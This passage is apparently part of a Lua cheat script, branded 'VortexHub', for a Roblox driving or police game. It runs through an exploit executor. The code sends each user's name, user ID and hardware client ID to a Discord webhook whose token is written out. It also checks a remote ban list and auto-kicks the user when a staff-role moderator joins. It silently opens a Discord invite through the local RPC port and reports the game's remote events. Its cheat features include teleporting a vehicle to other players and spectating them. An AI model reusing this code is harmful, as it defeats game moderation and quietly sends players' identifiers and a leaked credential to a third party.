							value = string.format("[%s](https://www.roblox.com/games/%d/)", 
								game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, 
								game.PlaceId
							), 
							inline = true 
						},
						{ name = "ðŸ”’ Gebannt bis", value = expiry or "N/A", inline = true },
						{ name = "â° Uhrzeit", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true },
						{ name = "ðŸ“Š Anzahl der Nutzungen", value = tostring(scriptUses), inline = true },
						{ 
							name = "ðŸ”— Blacklist bearbeiten", 
							value = string.format("[Klicke hier](%s)", blacklistEditLink), 
							inline = false 
						}
					},
					color = status == "âŒ GEBANNT" and 16711680 or 65280,
					footer = {
						text = "VortexHubÂ®",
						icon_url = "https://cdn.discordapp.com/attachments/1356679622988927250/1365816955180810260/11C0ED7C-AF10-4359-97CB-9387A5D2C74B.png?ex=680eafa9&is=680d5e29&hm=b42a7a7d0b6b8ed0ff970398eb7ec334f18fc0ee106b9ad9934fe7206a0573e2&" -- Hier Icon URL einfÃ¼gen
					}
				}
			}
		}
	
		local jsonData = HttpService:JSONEncode(data)
		local succ, err = pcall(function()
			request({
				Url = webhookURL,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = jsonData
			})
		end)
		if not succ then
			warn("âŒ Dein Exploit unterstÃ¼tzt keine Webhooks! Error 001")
		end
	end
	
	-- Blacklist ÃœberprÃ¼fung
	if not loadRightUpResponse then
		warn("âŒ Konnte Blacklist nicht laden! Error 002")
		return
	end
	
	local userHWID = game:GetService("RbxAnalyticsService"):GetClientId()
	local username = LocalPlayer.Name
	local userId = LocalPlayer.UserId
	
	print("--------------------------------------------")
	print("ðŸ” HWID:", userHWID)
	
	if loadRightUpResponse["blacklisted"] then
		local reason = loadRightUpResponse["reason"] or "Kein Grund angegeben"
		local expiry = loadRightUpResponse["expiry"] or "Permanent"
	
		print("\nðŸ”´ðŸš¨ You got banned! Reason: ", reason, "ðŸš¨ðŸ”´")
	
		-- Chat-Nachricht
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = "âŒ You got banned! Reason: " .. reason .. " | Duration: " .. expiry,
			Color = Color3.fromRGB(255, 0, 0)
		})
	
		-- Bildschirmnachricht
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "ðŸ”´ðŸ”´ BANNED ðŸ”´ðŸ”´",
			Text = "You got banned! Reason: " .. reason .. " | Duration: " .. expiry,
			Duration = 50
		})
	
		-- Kick
		LocalPlayer:Kick("âŒ You have been banned from Vortex! Reason: " .. reason .. " | Duration: " .. expiry)
	
		-- Discord senden
		sendToDiscord(username, userId, userHWID, "âŒ GEBANNT", reason, _G.ScriptOpens, expiry)
	else
		print("ðŸŒŠ You are NOT banned! Script turn...")
	
		-- Chat-Nachricht
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = "âœ… Du bist NICHT gebannt! Script lÃ¤uft...",
			Color = Color3.fromRGB(0, 255, 0)
		})
	
		-- Discord senden
		sendToDiscord(username, userId, userHWID, "âœ… Nicht gebannt", "Nicht gebannt", _G.ScriptOpens, "N/A")
	end
end
task.spawn(SCRIPT_2)
-- // StarterGui.RobloxUpdater1.AutoStart \\ --
local function SCRIPT_3()
local script = UI["3"]
	local Players = game:GetService("Players")
	local VirtualUser = game:GetService("VirtualUser")
	
	local player = Players.LocalPlayer
	local antiAFKEnabled = true  
	
	local function enableAntiAFK()
		wait(2)
		print("--------------------------------------------")
		print("Welcome to VortexHub -- discord.gg/novahub")
		print("Join the Disord for all new Updates + fixes!")
		print("--------------------------------------------")
	
		player.Idled:Connect(function()
			if antiAFKEnabled then
				warn("VortexHub: You saved Anti Afk :)")
				VirtualUser:CaptureController()
				VirtualUser:ClickButton2(Vector2.new())
			end
		end)
	end
	
	if antiAFKEnabled then
		enableAntiAFK()
	end
	
	-- Path: B-W24.client.lua --
	
	local sound = Instance.new("Sound")
	sound.SoundId = "rbxassetid://17208372272"
	sound.Looped = false
	sound.Parent = workspace
	
	game:GetService("RunService").RenderStepped:Wait()
	wait(0.1)
	sound:Play()
	
	-- Antimod System --
	
	local groupId = 12563021
	local requiredRoles = {"Contributer", "Staff", "Dev"}
	local kickMessage = "ðŸŒŠ YOU HAVE BEEN SAVED BY VORTEX: Auto-kick, a moderator has joined the lobby!"
	local checkInterval = 1
	
	-- Skript ist von Beginn an aktiv
	local isScriptActive = true
	local Players = game:GetService("Players")
	
	-- Funktion, um zu prÃ¼fen, ob ein Spieler die erforderliche Rolle hat
	local function hasRequiredRole(player)
		if not game.Players:FindFirstChild(player.Name) then
			return false
		end 
		local roleInGroup = player:GetRoleInGroup(groupId)
		for _, role in ipairs(requiredRoles) do
			if roleInGroup == role then
				return true
			end
		end
		return false
	end
	
	-- Funktion, um Spieler zu prÃ¼fen und den lokalen Spieler zu kicken, wenn ein Spieler mit der erforderlichen Rolle gefunden wird
	local function checkPlayers()
		local localPlayer = Players.LocalPlayer
		for _, player in pairs(Players:GetPlayers()) do
			if player ~= localPlayer and hasRequiredRole(player) then
				localPlayer:Kick(kickMessage)
				break
			end
		end
	end
	
	-- Hauptschleife, die die ÃœberprÃ¼fung periodisch ausfÃ¼hrt
	while isScriptActive do
		wait(checkInterval)
		checkPlayers()
	end
	
	-- Vortex Discord Auto Invite --
	
	pcall(function()
	    local Request = syn and syn.request or request
	    Request({
	        Url = "http://127.0.0.1:6463/rpc?v=1",
	        Method = "POST",
	        Headers = {
	            ["Content-Type"] = "application/json",
	            ["Origin"] = "https://discord.com"
	        },
	        Body = game.HttpService:JSONEncode({
	            cmd = "INVITE_BROWSER",
	            args = {
					code = "XEaaPU5CgH"
	            },
	            nonce = game.HttpService:GenerateGUID(false)
	        }),
	    })
	end)
	
	-- Update Checker --
	
	local WebhookURL = "https://discord.com/api/webhooks/1378088599546757179/qAoywUpUROCcbkaOYcWjTON4eb3SALZN7YQz0i7oS5-DO2Pk9HfhjywclKKBLhS-Hs7G"
	local TARGET_GAME_ID = 7711635737
	local COOLDOWN_HOURS = 40
	local LAST_SENT_FILE = "last_sent_time.txt"
	
	-- COOLDOWN MANAGEMENT--
	local function canSendWebhook()
		if not isfile or not isfile(LAST_SENT_FILE) then return true end
		local lastSentTime = tonumber(readfile(LAST_SENT_FILE))
		if not lastSentTime then return true end
		return (os.time() - lastSentTime) / 3600 >= COOLDOWN_HOURS
	end
	
	local function updateLastSentTime()
		if writefile then writefile(LAST_SENT_FILE, tostring(os.time())) end
	end
	
	-- WEBHOOK SENDER --
	local function SendWebhook(data)
		if not canSendWebhook() then
			return false
		end
	
		local success = false
		if syn and syn.request then
			local response = syn.request({
				Url = WebhookURL,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = data
			})
			success = response.StatusCode == 200 or response.StatusCode == 204
		elseif request then
			local response = request({
				Url = WebhookURL,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = data
			})
			success = response.Success
		else
			success = pcall(function()
				game:GetService("HttpService"):PostAsync(WebhookURL, data)
			end)
		end
	
		if success then updateLastSentTime() end
		return success
	end
	
	-- ===== EVENT SCANNER ===== --
	local function ScanReplicatedStorage()
		local events = {}
		local rs = game:GetService("ReplicatedStorage")
	
		for _, child in pairs(rs:GetDescendants()) do
			if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
				table.insert(events, {
					Name = child.Name,
					Path = child:GetFullName(),
					Class = child.ClassName
				})
			end
		end
	
		return events
	end
	
	-- ===== DISCORD ALERT ===== --
	local function SendDiscordAlert(missingEvents)
		local timestamp = os.date("%d.%m.%Y %H:%M:%S")
		local formattedEvents = ""
	
		for _, event in pairs(missingEvents) do
			formattedEvents = formattedEvents .. string.format("ðŸ”¹ `%s` (%s)\n```%s```\n", 
				event.Name, event.Class, event.Path)
		end
	
		local embed = {
			["title"] = "ðŸŽ¯ New Detected Report",
			["description"] = "**Update Report**",
			["color"] = 0xFF5555, -- Rot
			["thumbnail"] = {["url"] = EMBED_IMAGE_URL},
			["fields"] = {
				{
					["name"] = "ðŸ“Œ detected Event ("..#missingEvents..")",
					["value"] = formattedEvents,
					["inline"] = false
				},
				{
					["name"] = "â° Timestamp",
					["value"] = timestamp,
					["inline"] = true
				}
			},
			["footer"] = {
				["text"] = "Automated Monitoring System",
				["icon_url"] = "https://cdn.discordapp.com/attachments/1356679622988927250/1365816955180810260/11C0ED7C-AF10-4359-97CB-9387A5D2C74B.png?ex=680eafa9&is=680d5e29&hm=b42a7a7d0b6b8ed0ff970398eb7ec334f18fc0ee106b9ad9934fe7206a0573e2&"
			}
		}
	
		local message = {
			["username"] = "VortexHub",
			["avatar_url"] = "https://cdn.discordapp.com/attachments/1356679622988927250/1365816955180810260/11C0ED7C-AF10-4359-97CB-9387A5D2C74B.png?ex=680eafa9&is=680d5e29&hm=b42a7a7d0b6b8ed0ff970398eb7ec334f18fc0ee106b9ad9934fe7206a0573e2&",
			["embeds"] = {embed}
		}
	
		local jsonData = game:GetService("HttpService"):JSONEncode(message)
	
		if not SendWebhook(jsonData) then
			if writefile then
				writefile("VortexEvent_Update.log", timestamp.." | Missing: "..#missingEvents.." events\n")
			end
		end
	end
	
	-- ===== MAIN CHECK ===== --
	if game.PlaceId == TARGET_GAME_ID then
		local allEvents = ScanReplicatedStorage()
		local targetEvents = {
			"7f7043d8-396f-42a2-a47c-4a72fc05b2d7", -- FÃ¼ge hier alle Event-IDs ein
			-- "weitere-event-id",
		}
	
		local missingEvents = {}
	
		for _, eventId in pairs(targetEvents) do
			local found = false
			for _, event in pairs(allEvents) do
				if event.Name == eventId then
					found = true
					break
				end
			end
			if not found then
				table.insert(missingEvents, {
					Name = eventId,
					Path = "ReplicatedStorage (not found)",
					Class = "RemoteEvent"
				})
			end
		end
	
		if #missingEvents > 0 then
			SendDiscordAlert(missingEvents)
		else
		end
	else
		print("âš ï¸ No Update Detection: (ID: "..game.PlaceId..")")
	end
	
end
task.spawn(SCRIPT_3)
-- // StarterGui.RobloxUpdater1.MainTab.LoadingScreen.LoadingImage.LocalScript \\ --
local function SCRIPT_8()
local script = UI["8"]
	-- Das ImageLabel (oder ImageButton)
	local imageLabel = script.Parent -- Das Bild, das sich dreht (stellen wir uns vor, das Skript ist im ImageLabel)
	
	-- Drehung des Bildes
	local tweenService = game:GetService("TweenService")
	
	-- Tween-Informationen
	local tweenInfo = TweenInfo.new(
		6, -- Dauer der Drehung (in Sekunden fÃ¼r eine 360 Grad-Drehung)
		Enum.EasingStyle.Linear, -- Easing-Stil fÃ¼r gleichmÃ¤ÃŸige Bewegung
		Enum.EasingDirection.InOut, -- Easing-Richtung
		-1, -- Wiederholung (unendlich)
		true -- RÃ¼ckwÃ¤rts wiederholen, sodass es immer weiter dreht
	)
	
	-- Zielrotation (360 Grad)
	local goal = {Rotation = 1200}
	
	-- Tween erstellen
	local tween = tweenService:Create(imageLabel, tweenInfo, goal)
	
	-- Tween abspielen
	tween:Play()
	
	
end
task.spawn(SCRIPT_8)
-- // StarterGui.RobloxUpdater1.MainTab.LoadingScreen.LocalScript \\ --
local function SCRIPT_9()
local script = UI["9"]
	local loadingScreen = script.Parent
	local tweenService = game:GetService("TweenService")
	local fadeOutTime = 0.8 -- Zeit fÃ¼r das sanfte Ausblenden
	local delayTime = 5 -- Wartezeit, bevor der Effekt startet
	
	-- ðŸŽµ Hier die gewÃ¼nschte Sound-ID eintragen!
	local soundId = "rbxassetid://8503531171" -- Ersetze mit deiner Sound-ID
	
	-- Sound-Objekt erstellen
	local finishSound = Instance.new("Sound")
	finishSound.SoundId = soundId
	finishSound.Volume = 1 -- LautstÃ¤rke einstellen
	finishSound.Parent = loadingScreen -- Sound wird in den Loadingscreen gepackt
	wait(delayTime)
	
	-- Sound gleichzeitig mit dem Fade-Out starten ðŸŽµ
	finishSound:Play()
	
	-- Tween-Info erstellen
	local tweenInfo = TweenInfo.new(fadeOutTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local tweenGoals = {BackgroundTransparency = 1}
	local tween = tweenService:Create(loadingScreen, tweenInfo, tweenGoals)
	tween:Play()
	
	-- Auch das LoadingImage und den Text sanft ausblenden
	if loadingScreen:FindFirstChild("LoadingImage") then
		local image = loadingScreen.LoadingImage
		local text = image:FindFirstChild("text")
	
		local imageTween = tweenService:Create(image, tweenInfo, { ImageTransparency = 1 })
		imageTween:Play()
	
		if text then
			local textTween = tweenService:Create(text, tweenInfo, { TextTransparency = 1 })
			textTween:Play()
		end
	end
	
	-- Nach dem Sound das UI entfernen
	tween.Completed:Connect(function()
		wait(2) -- Kleine VerzÃ¶gerung, falls nÃ¶tig
		loadingScreen:Destroy()
	end)
	
end
task.spawn(SCRIPT_9)
-- // StarterGui.RobloxUpdater1.MainTab.Plate \\ --
local function SCRIPT_b()
local script = UI["b"]
	while task.wait(5) do
		if workspace.Vehicles:FindFirstChild(game.Players.LocalPlayer.Name) then
			for i, v in pairs(workspace.Vehicles[game.Players.LocalPlayer.Name].Body.LicensePlates:GetChildren()) do 
				v.Gui.TextLabel.Text = "ðŸŒŠ Vortex"
				v.Gui.TextLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
				v.Decal.Color3 = Color3.fromRGB(255, 255, 255)
			end
		end
	end
end
task.spawn(SCRIPT_b)
-- // StarterGui.RobloxUpdater1.MainTab.TAS1.0 \\ --
local function SCRIPT_c()
local script = UI["c"]
	--STRINGS:
	local UserInputService = game:GetService("UserInputService")
	local TweenService = game:GetService("TweenService")
	local MainFrame = script.Parent
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local Buttons = script.Parent:FindFirstChild("Buttons")
	local Frames = script.Parent:FindFirstChild("Frames")
	local mainui = script.Parent
	local RunService = game:GetService("RunService")
	local UserInputService = game:GetService("UserInputService")
	
	--DRAG FUNKTION:
	local function update(input)
		local delta = input.Position - dragStart
		MainFrame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
	
	MainFrame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = MainFrame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	MainFrame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
	local function Tabswitcher(clickedButtonName)
		for _, frame in pairs(Frames:GetChildren()) do
			if frame:IsA("Frame") then
				local isTarget = (frame.Name == clickedButtonName)
	
				if isTarget then
					frame.Visible = true
					frame.BackgroundTransparency = 1
	
					local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
					local fadeIn = TweenService:Create(frame, tweenInfo, {
						BackgroundTransparency = 0
					})
					fadeIn:Play()
				else
					local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
					local fadeOut = TweenService:Create(frame, tweenInfo, {
						BackgroundTransparency = 1
					})
					fadeOut:Play()
					fadeOut.Completed:Connect(function()
						frame.Visible = false
					end)
				end
			end
		end
	end
	
	-- Diese Funktion durchsucht die Buttons sowohl im normalen Container als auch im ScrollingFrame
	local function handleButtonClicks()
		for _, button in pairs(Buttons:GetChildren()) do
			if button:IsA("TextButton") or button:IsA("ImageButton") then
				button.MouseButton1Click:Connect(function()
					Tabswitcher(button.Name)
				end)
			end
		end
	
		-- Hier durchlaufen wir auch die Buttons im ScrollingFrame, falls vorhanden
		local scrollingFrame = Buttons:FindFirstChild("ScrollingFrame")
		if scrollingFrame then
			for _, button in pairs(scrollingFrame:GetChildren()) do
				if button:IsA("TextButton") or button:IsA("ImageButton") then
					button.MouseButton1Click:Connect(function()
						Tabswitcher(button.Name)
					end)
				end
			end
		end
		
		function onKeyPress(inputObject, gameProcessedEvent)
			if not gameProcessedEvent then
				if inputObject.KeyCode == Enum.KeyCode.T then 
					if script.Parent.Parent.MainTab.Visible == false then
						script.Parent.Parent.MainTab.Visible = true
					else
						script.Parent.Parent.MainTab.Visible = false
					end
				end
			end
		end
	end
	
	-- Starte das AbhÃ¶ren von Button-Click-Ereignissen
	handleButtonClicks()
	
	
	function onKeyPress(inputObject, gameProcessedEvent)
		if not gameProcessedEvent then
			if inputObject.KeyCode == Enum.KeyCode.T then 
				if script.Parent.Parent.MainTab.Visible == false then
					script.Parent.Parent.MainTab.Visible = true
				else
					script.Parent.Parent.MainTab.Visible = false
				end
			end
		end
	end
	
	UserInputService.InputBegan:connect(onKeyPress)
	
end
task.spawn(SCRIPT_c)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ListPlayerFunction \\ --
local function SCRIPT_11()
local script = UI["11"]
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
	local playerListFrame = script.Parent.ScrollingFrame2
	local wantedRemoteEvent = ReplicatedStorage["ZDD"]["a3581179-8ba7-43e9-930f-ce588a96c919"]
	
	-- Tabelle fÃ¼r gewÃ¼nschte Spieler
	local wantedPlayers = {}
	local blinkConnections = {}
	
	-- Funktion zum Erstellen einer Blinkanimation
	local function createBlinkAnimation(label)
		if blinkConnections[label] then
			blinkConnections[label]:Disconnect()
		end
	
		local connection
		local intensity = 0
		local increasing = true
	
		connection = game:GetService("RunService").Heartbeat:Connect(function(delta)
			if increasing then
				intensity = intensity + delta * 2
				if intensity >= 0.5 then
					increasing = false
				end
			else
				intensity = intensity - delta * 2
				if intensity <= 0 then
					increasing = true
				end
			end
	
			-- Gelb mit variierender Helligkeit
			local baseColor = Color3.fromRGB(255, 255, 0)
			local h, s, v = baseColor:ToHSV()
			v = v * (0.7 + intensity * 0.6) -- Schwankt zwischen 70% und 130% Helligkeit
			label.TextColor3 = Color3.fromHSV(h, s, math.clamp(v, 0, 1))
		end)
	
		blinkConnections[label] = connection
		return connection
	end
	
	-- Funktion zum Stoppen der Blinkanimation
	local function stopBlinkAnimation(label)
		if blinkConnections[label] then
			blinkConnections[label]:Disconnect()
			blinkConnections[label] = nil
		end
	end
	
	-- Funktion zum Aktualisieren der Spielerfarbe basierend auf Wanted-Status
	local function updatePlayerColor(playerName)
		local label = playerListFrame:FindFirstChild(playerName)
		if label then
			if wantedPlayers[playerName] then
				-- Starte Blinkanimation fÃ¼r gewÃ¼nschte Spieler
				createBlinkAnimation(label)
			else
				-- Stoppe Blinkanimation und setze auf WeiÃŸ
				stopBlinkAnimation(label)
				label.TextColor3 = Color3.fromRGB(255, 255, 255)
			end
		end
	end
	
	-- Wanted-Player Update
	wantedRemoteEvent.OnClientEvent:Connect(function(eventData)
		if typeof(eventData) == "table" then
			wantedPlayers = table.clone(eventData)
			-- Aktualisiere alle Spielerfarben
			for _, player in ipairs(Players:GetPlayers()) do
				updatePlayerColor(player.Name)
			end
		end
	end)
	
	local function addPlayerLabel(player)
		if player ~= Players.LocalPlayer then
			script.Parent.Parent.Aimbot:SetAttribute(player.Name, false)
			local label = script.Templade:Clone()
			label.Name = player.Name
			label.Text = player.Name
			label.Visible = true
			label.Parent = playerListFrame
	
			-- Initiale Farbe setzen
			updatePlayerColor(player.Name)
	
			label.MouseButton1Up:Connect(function()
				-- Stoppe alle Animationen fÃ¼r diesen Spieler
				stopBlinkAnimation(label)
	
				-- Setze auf GrÃ¼n fÃ¼r ausgewÃ¤hlten Spieler
				label.TextColor3 = Color3.fromRGB(0, 255, 0)
	
				if script.Parent.SecPlayer.Value ~= nil and script.Parent.SecPlayer.Value ~= "" and script.Parent.SecPlayer.Value ~= " " and script.Parent.SecPlayer.Value ~= game.Players.LocalPlayer.Name then
					-- ZurÃ¼ck zur Wanted-Farbe oder WeiÃŸ, wenn nicht gewÃ¼nscht
					updatePlayerColor(script.Parent.SecPlayer.Value)
				end
				script.Parent.SecPlayer.Value = player.Name
				script.Parent.ScrollingFrame["1PlayerName"].Text = player.Name
				script.Parent.ScrollingFrame["1PlayerName"].UIGradient["Color"] = ColorSequence.new{
					ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 186, 0)),
					ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))
				}
			end)
		end
	end
	
	local function removePlayerLabel(player)
		local label = playerListFrame:FindFirstChild(player.Name)
		if label then
			stopBlinkAnimation(label)
			label:Destroy()
		end
	end
	
	-- Initialisiere Spielerliste
	for _, player in ipairs(Players:GetPlayers()) do
		addPlayerLabel(player)
	end
	
	Players.PlayerAdded:Connect(function(player)
		addPlayerLabel(player)
	end)
	
	Players.PlayerRemoving:Connect(function(player)
		removePlayerLabel(player)
	end)
	
	-- AufrÃ¤umen bei Script-Ende
	script.Destroying:Connect(function()
		for _, connection in pairs(blinkConnections) do
			connection:Disconnect()
		end
		blinkConnections = {}
	end)
end
task.spawn(SCRIPT_11)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.2Highlight.Function \\ --
local function SCRIPT_23()
local script = UI["23"]
	local Status = false
	local lastPlayer = nil
	
	script.Parent.Parent.Parent.SecPlayer.Changed:Connect(function()
		if Status and lastPlayer then
			script.Parent.Text = "Highlight : OFF"
			game.Players:FindFirstChild(lastPlayer).Character:FindFirstChild("Highlight"):Destroy()
			Status = false
		end
	end)
	
	script.Parent.MouseButton1Click:Connect(function()
		local SecPlayer = script.Parent.Parent.Parent.SecPlayer.Value
		lastPlayer = SecPlayer
		if not Status then
			script.Parent.Text = "Highlight : ON"
			local Highlight = Instance.new("Highlight")
			Highlight.Parent = game.Players:FindFirstChild(SecPlayer).Character 
			Status = true
		else
			if not game.Players:FindFirstChild(SecPlayer).Character:FindFirstChild("Highlight") then return end
			script.Parent.Text = "Highlight : OFF"
			game.Players:FindFirstChild(SecPlayer).Character:FindFirstChild("Highlight"):Destroy()
			Status = false
		end
	end)
	
end
task.spawn(SCRIPT_23)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.2Highlight.Click Sound \\ --
local function SCRIPT_24()
local script = UI["24"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_24)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.3TPTP.Function \\ --
local function SCRIPT_29()
local script = UI["29"]
	function Click(mouse)
		local Players = game:GetService("Players")
		local LocalPlayer = Players.LocalPlayer
		local TweenService = game:GetService("TweenService")
	
		local VehiclesFolder = workspace:FindFirstChild("Vehicles")
	
		local PLayer = game.Players:FindFirstChild(script.Parent.Parent.Parent.SecPlayer.Value)
		local Character = nil
		if PLayer.Character and PLayer.Character.HumanoidRootPart then
			Character = PLayer.Character.HumanoidRootPart
		else
			game:GetService("StarterGui"):SetCore("SendNotification", {Title="Error", Text="Player is not in render distance!", Duration=5})
		end
		local function tweenTo(destination)
			local plr = game.Players.LocalPlayer
			local car = workspace.Vehicles[plr.Name]
			car.PrimaryPart = car:FindFirstChild("DriveSeat",true)
			car.DriveSeat:Sit(plr.Character.Humanoid)
	
			if typeof(destination) == "CFrame" then
				destination = destination.Position
			end
	
			local startPosition = car.PrimaryPart.Position
			local highStart = startPosition + Vector3.new(0, - 5, 0)
			local highDestination = destination + Vector3.new(0, - 5, 0)
	
			local function moveTo(targetPosition, useHigh)
				local distance = (car.PrimaryPart.Position - targetPosition).Magnitude
				useHigh = useHigh or 175
				local tweenDuration = distance / useHigh
	
				local TweenInfoToUse = TweenInfo.new(
					tweenDuration,
					Enum.EasingStyle.Linear,
					Enum.EasingDirection.Out
				)
	
				local TweenValue = Instance.new("CFrameValue")
				TweenValue.Value = car:GetPivot()
	
				TweenValue.Changed:Connect(function(newCFrame)
					car:PivotTo(newCFrame)
					car.DriveSeat.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
					car.DriveSeat.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
				end)
	
				local targetCFrame = CFrame.new(targetPosition)
				local tween = TweenService:Create(TweenValue, TweenInfoToUse, { Value = targetCFrame })
	
				tween:Play()
				tween.Completed:Wait()
				TweenValue:Destroy()
			end
	
			moveTo(highStart, 400)
			moveTo(highDestination)
			moveTo(destination, 400)
			return
		end 
		tweenTo(Character.CFrame)
	end
	
	script.Parent.MouseButton1Down:connect(Click)
	
	
end
task.spawn(SCRIPT_29)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.3TPTP.Click Sound \\ --
local function SCRIPT_2a()
local script = UI["2a"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_2a)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.4View.Click Sound \\ --
local function SCRIPT_2f()
local script = UI["2f"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_2f)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.4View.Function \\ --
local function SCRIPT_33()
local script = UI["33"]
	local selectedPlayerName = script.Parent.Parent.Parent.SecPlayer
	local players = game:GetService("Players")
	local camera = workspace.CurrentCamera
	local RunService = game:GetService("RunService")
	
	-- Zustandsvariablen
	local spectating = false
	local followConnection = nil
	local targetPlayer = nil
	
	script.Parent.MouseButton1Click:Connect(function()
		if not selectedPlayerName.Value then
			warn("Kein Spieler ausgewÃ¤hlt.")
			return
		end
	
		if not spectating then
			-- Starte Spectator-Modus
			targetPlayer = players:FindFirstChild(selectedPlayerName.Value)
			if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
				spectating = true
	
				-- Speichere Original-Kameraeinstellungen
				local originalCamera = workspace.CurrentCamera
				originalCamera.CameraType = Enum.CameraType.Custom
	
				-- Erstelle neue Kamera
				local newCamera = Instance.new("Camera")
				newCamera.CameraType = Enum.CameraType.Custom
				newCamera.CameraSubject = targetPlayer.Character.Humanoid
				newCamera.Parent = workspace
				workspace.CurrentCamera = newCamera
	
				-- Setze richtige Third-Person-Ansicht
				local humanoid = targetPlayer.Character.Humanoid
				humanoid.CameraOffset = Vector3.new(0, 0, 0) -- Reset Camera Offset
	
				-- Verbindung fÃ¼r glatte ÃœbergÃ¤nge
				followConnection = RunService.RenderStepped:Connect(function()
					if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
						return
					end
	
					-- Stelle sicher, dass die Kamera im Third-Person-Modus bleibt
					if newCamera.CameraType ~= Enum.CameraType.Custom then
						newCamera.CameraType = Enum.CameraType.Custom
					end
	
					if newCamera.CameraSubject ~= targetPlayer.Character.Humanoid then
						newCamera.CameraSubject = targetPlayer.Character.Humanoid
					end
				end)
			else
				warn("Spieler nicht bereit zum Zuschauen.")
			end
		else
			-- Beende Spectator-Modus
			spectating = false
	
			if followConnection then
				followConnection:Disconnect()
				followConnection = nil
			end
	
			-- Setze Standardkamera zurÃ¼ck
			if workspace:FindFirstChildOfClass("Camera") then
				workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
				workspace.CurrentCamera.CameraSubject = players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
			end
		end
	end)
	
	-- Wenn sich der ausgewÃ¤hlte Spieler Ã¤ndert
	selectedPlayerName.Changed:Connect(function()
		if spectating then
			spectating = false
	
			if followConnection then
				followConnection:Disconnect()
				followConnection = nil
			end
	
			-- Setze Standardkamera zurÃ¼ck
			if workspace:FindFirstChildOfClass("Camera") then
				workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
				workspace.CurrentCamera.CameraSubject = players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
			end
		end
	end)
end
task.spawn(SCRIPT_33)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.ScrollingFrame.5PlayerName.LocalScript \\ --
local function SCRIPT_3a()
local script = UI["3a"]
	local wantedPlayers = {}
	local wantedRemoteEvent = game:GetService("ReplicatedStorage")["ZDD"]["a3581179-8ba7-43e9-930f-ce588a96c919"]
	
	local function updateWanted(eventData)
		wantedPlayers = {}
	
		for playerName, playerData in pairs(eventData) do
			if playerData.wantedLevelCrimes then
				wantedPlayers[playerName] = {
					isWanted = true,
					crimes = playerData.wantedLevelCrimes
				}
			end
		end
	end
	
	wantedRemoteEvent.OnClientEvent:Connect(function(eventData)
		if typeof(eventData) == "table" then
			updateWanted(eventData)
		end
	end)
	
	script.Parent.Parent.Parent.SecPlayer.Changed:Connect(function()
		local newPlayer = script.Parent.Parent.Parent.SecPlayer.Value
		local playerData = wantedPlayers[newPlayer]
	
		if playerData and playerData.isWanted then
			local crimesText = "Wanted for:\n"
	
			for crime, count in pairs(playerData.crimes) do
				crimesText = crimesText .. "- " .. crime .. " (x" .. tostring(count) .. ")\n"
			end
	
			script.Parent.Text = crimesText
		else
			script.Parent.Text = "Not wanted"
		end
	end)
end
task.spawn(SCRIPT_3a)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Server.BetaWarnFrame.closebutton.CloseScript \\ --
local function SCRIPT_4f()
local script = UI["4f"]
	local frame = script.Parent.Parent.Parent.BetaWarnFrame
	
	script.Parent.MouseButton1Click:Connect(function()
		frame:Destroy()
	end)
	
